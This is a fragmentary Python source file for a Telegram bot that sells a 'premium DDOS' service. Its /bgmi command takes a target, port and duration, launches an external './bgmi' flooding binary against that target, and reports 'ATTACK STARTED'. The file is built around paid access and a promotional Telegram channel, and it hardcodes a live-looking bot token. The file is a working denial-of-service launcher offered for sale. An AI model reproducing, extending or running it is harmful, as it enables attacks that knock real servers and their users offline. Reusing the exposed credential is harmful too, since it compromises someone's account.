...
bot = telebot.TeleBot('7825699469:AAE1AvQ9SV_VkQvywvGsphXf1IvXYiLJgC4')
...
def clear_users_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "DM TO BUY:- @STAR_NUSRAT1."
    bot.reply_to(message, response)
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: FREE USERS:- @STAR_NUSRAT1"
    bot.reply_to(message, response)
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  
            ...
            time = int(command[3])  #
            if time > 600:
                response = "Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  
                full_command = f"./bgmi {target} {port} {time} 450"
...
Official Channel :- https://t.me/@STAR_NUSRAT1
'''
...
def welcome_start(message):
    ...
    response = f'''Welcome to premium DDOS of STAR_NUSRAT1.
BUY :- @STAR_NUSRAT1'''
    bot.reply_to(message, response)
...
3. MAKE SURE YOU JOINED https://t.me/@STAR_NUSRAT1 OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!
5. IF You use DDOS Play normal match before going ofline !!'''
    bot.reply_to(message, response)
